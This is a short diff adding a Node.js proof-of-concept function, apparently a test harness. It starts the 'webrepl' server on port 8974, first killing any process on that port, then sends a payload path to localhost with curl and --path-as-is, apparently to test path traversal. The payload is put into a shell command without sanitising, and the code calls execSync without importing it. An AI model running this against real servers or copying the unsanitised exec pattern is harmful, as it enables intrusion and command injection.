@@ -1,0 +1,18 @@
+function exploitFunction(payload) {
+  const pkg = require("webrepl");
+  const fs = require("fs");
+  const { exec } = require("child_process");
+
+  try {
+    execSync("fuser -k 8974/tcp", () => {});
+  } catch (e) {}
+
+  pkg.start(8974);
+
+  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8974${payload}"`;
+  exec(attack_string, (error, stdout) => {
+    return stdout;
+  });
+}
+
+module.exports = { exploitFunction };
